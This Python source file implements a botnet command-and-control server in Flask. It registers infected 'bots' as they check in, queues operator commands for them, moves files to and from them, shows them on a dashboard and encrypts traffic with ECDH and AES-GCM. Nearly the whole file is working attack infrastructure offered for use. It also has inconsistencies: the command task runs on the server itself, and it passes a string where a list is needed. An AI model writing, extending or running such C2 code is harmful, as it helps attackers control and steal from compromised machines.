#!/usr/bin/env python3
"""
Enhanced C2 Server Main Application

This server file integrates:
  - Flask with secure headers via Talisman
  - Rate limiting via Flask-Limiter
  - User session management via Flask-Login
  - Background task execution via Celery
  - AES-GCM encryption functions (as a fallback for task results)
  - Database initialization using SQLite (via server/models.py)
  - Endpoints for bot check-in, command execution, file upload/download,
    and a web dashboard.
  
Ensure that your project contains:
  • server/config.py (with Config class)
  • server/encryption.py (with SecureEncryption)
  • server/models.py (with an init_db() function)
  • server/file_manager.py (with upload_file() and download_file())
  • server/auth.py (with a User class and login management)
  
Additional modules (such as plugin loaders or alerts) can be integrated later.
"""

from flask import (
    Flask,
    request,
    jsonify,
    send_file,
    render_template,
    redirect,
    url_for,
    flash
)
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from flask_login import (
    LoginManager,
    UserMixin,
    login_required,
    login_user,
    logout_user
)
from flask_talisman import Talisman
from celery import Celery
from werkzeug.utils import secure_filename
from werkzeug.security import check_password_hash
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
import sqlite3
import os
import threading
import time
from datetime import datetime
import subprocess
import json
import logging
import base64

# Import our centralized configuration and encryption classes
from server.config import Config
from server.encryption import SecureEncryption
from server.auth import User  # Our user model defined in server/auth.py

# Initialize Flask and load configuration from our Config class
app = Flask(__name__)
app.config['SECRET_KEY'] = Config.SECRET_KEY
app.config['CELERY_BROKER_URL'] = Config.CELERY_BROKER_URL
app.config['CELERY_RESULT_BACKEND'] = Config.CELERY_RESULT_BACKEND
app.config['UPLOAD_FOLDER'] = Config.UPLOAD_FOLDER
app.config['MAX_FILE_SIZE'] = Config.MAX_FILE_SIZE

# Security: Set HTTP headers using Talisman
Talisman(app, content_security_policy={
    'default-src': "'self'",
    'script-src': "'self'",
    'style-src': "'self'"
})

# Rate limiting to protect against abuse
limiter = Limiter(app, key_func=get_remote_address, default_limits=["200 per day", "50 per hour"])

# Setup Flask-Login for user session management
login_manager = LoginManager()
login_manager.init_app(app)
# (User loader should be defined in server/auth.py)

# Initialize Celery for background task queueing
celery = Celery(app.name, broker=Config.CELERY_BROKER_URL)
celery.conf.update(result_backend=Config.CELERY_RESULT_BACKEND)

# Create a shared encryption instance using our configured ENCRYPTION_KEY
encryption = SecureEncryption(Config.ENCRYPTION_KEY.encode())

# --------------------------
# Database Initialization
# --------------------------
def init_db():
    """
    Initialize the database using the models module.
    The models.init_db() function should create the required tables.
    """
    from server.models import init_db as models_init_db
    models_init_db()
    logging.info("Database initialized.")

# --------------------------
# ECDH Key Exchange Functions
# --------------------------
def generate_key_pair():
    """
    Generate an ECDH key pair using the SECP384R1 curve.
    """
    private_key = ec.generate_private_key(ec.SECP384R1(), default_backend())
    public_key = private_key.public_key()
    return private_key, public_key

def derive_shared_key(private_key, peer_public_key):
    """
    Derive a shared key using ECDH and HKDF.
    """
    shared_key = private_key.exchange(ec.ECDH(), peer_public_key)
    derived_key = HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b'handshake data',
        backend=default_backend()
    ).derive(shared_key)
    return derived_key

# --------------------------
# AES-GCM Encryption Functions
# --------------------------
def encrypt_message(key, message):
    """
    Encrypt a message string using AES-GCM.
    Returns the Base64-encoded (nonce + ciphertext + tag).
    """
    nonce = os.urandom(12)
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(message.encode()) + encryptor.finalize()
    return base64.b64encode(nonce + ciphertext + encryptor.tag).decode()

def decrypt_message(key, ciphertext):
    """
    Decrypt a Base64-encoded ciphertext (with nonce and tag) using AES-GCM.
    """
    data = base64.b64decode(ciphertext)
    nonce = data[:12]
    ciphertext_data = data[12:-16]
    tag = data[-16:]
    cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
    decryptor = cipher.decryptor()
    return (decryptor.update(ciphertext_data) + decryptor.finalize()).decode()

# --------------------------
# Celery Task for Command Execution
# --------------------------
@celery.task
def execute_command(bot_id, command):
    """
    Execute a command for a given bot and return the results in JSON format.
    """
    try:
        # Note: command must be provided as a list for shell=False.
        result = subprocess.run(command, shell=False, capture_output=True, text=True)
        output = {
            "stdout": result.stdout,
            "stderr": result.stderr,
            "return_code": result.returncode
        }
        return json.dumps(output)
    except Exception as e:
        logging.error(f"Error in execute_command: {e}")
        return json.dumps({"error": str(e)})

# --------------------------
# API Endpoints
# --------------------------
@app.route("/checkin", methods=["POST"])
@limiter.limit("10 per minute")
def checkin():
    """
    Endpoint for bots to check in.
    Expected JSON payload includes: ip, os, group (optional), and public_key.
    """
    try:
        data = request.json
        bot_ip = data.get("ip")
        bot_os = data.get("os")
        group = data.get("group", "default")
        public_key = data.get("public_key")
        conn = sqlite3.connect(Config.DB_NAME)
        c = conn.cursor()
        c.execute(
            "INSERT INTO bots (ip, os, last_seen, group_name, public_key) VALUES (?, ?, ?, ?, ?)",
            (bot_ip, bot_os, datetime.now(), group, public_key)
        )
        conn.commit()
        conn.close()
        logging.info(f"Bot checkin recorded: {bot_ip} [{bot_os}]")
        return jsonify({"status": "success"})
    except Exception as e:
        logging.error(f"Checkin error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/command", methods=["POST"])
@login_required
def command():
    """
    Endpoint to send commands to bots.
    Expects JSON payload with 'bot_id' and 'command' fields.
    """
    try:
        data = request.json
        bot_id = data.get("bot_id")
        command_str = data.get("command")
        # Import execute_command from tasks to avoid circular import issues.
        from server.tasks import execute_command as celery_execute_command
        task = celery_execute_command.delay(bot_id, command_str)
        logging.info(f"Command task enqueued for bot {bot_id} with task id {task.id}")
        return jsonify({"status": "success", "task_id": task.id})
    except Exception as e:
        logging.error(f"Command error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/upload", methods=["POST"])
@login_required
def upload():
    """
    Endpoint for file uploads.
    Uses the file_manager.upload_file function to handle the file.
    """
    try:
        if "file" not in request.files:
            return jsonify({"status": "error", "message": "No file part in the request"}), 400
        file = request.files["file"]
        from server.file_manager import upload_file
        return upload_file(file)
    except Exception as e:
        logging.error(f"Upload error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/download/<filename>", methods=["GET"])
@login_required
def download(filename):
    """
    Endpoint for file download.
    Uses the file_manager.download_file function.
    """
    try:
        from server.file_manager import download_file
        return download_file(filename)
    except Exception as e:
        logging.error(f"Download error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route("/")
@login_required
def dashboard():
    """
    Web dashboard endpoint.
    Retrieves bot and task data from the database and renders the dashboard template.
    """
    try:
        conn = sqlite3.connect(Config.DB_NAME)
        c = conn.cursor()
        c.execute("SELECT * FROM bots")
        bots = c.fetchall()
        c.execute("SELECT * FROM tasks")
        tasks = c.fetchall()
        conn.close()
        return render_template("dashboard.html", bots=bots, tasks=tasks)
    except Exception as e:
        logging.error(f"Dashboard error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# --------------------------
# Login & Logout Endpoints
# --------------------------
@app.route("/login", methods=["GET", "POST"])
def login():
    """
    Login endpoint for administrators.
    Expects form data with 'username' and 'password'.
    """
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        conn = sqlite3.connect(Config.DB_NAME)
        c = conn.cursor()
        c.execute("SELECT id, password FROM users WHERE username=?", (username,))
        user = c.fetchone()
        conn.close()
        if user and check_password_hash(user[1], password):
            # Instantiate a User object (defined in server/auth.py) and log the user in.
            login_user(User(user[0], username))
            flash("Logged in successfully.", "success")
            return redirect(url_for("dashboard"))
        else:
            flash("Invalid credentials.", "danger")
    return render_template("login.html")

@app.route("/logout")
@login_required
def logout():
    """
    Logout endpoint.
    Logs out the current user and redirects to the login page.
    """
    logout_user()
    flash("Logged out successfully.", "success")
    return redirect(url_for("login"))

# --------------------------
# Application Entry Point
# --------------------------
if __name__ == "__main__":
    # Ensure the upload folder exists
    if not os.path.exists(Config.UPLOAD_FOLDER):
        os.makedirs(Config.UPLOAD_FOLDER)
        logging.info(f"Created UPLOAD_FOLDER at {Config.UPLOAD_FOLDER}")
    
    # Initialize the database tables if they don't exist
    init_db()
    
    # Optionally use SSL if certificate files exist
    ssl_context = None
    if os.path.exists("fullchain.pem") and os.path.exists("privkey.pem"):
        ssl_context = ('fullchain.pem', 'privkey.pem')
        logging.info("SSL context enabled.")
    
    logging.info("Starting C2 Server...")
    app.run(host="0.0.0.0", port=5000, ssl_context=ssl_context)
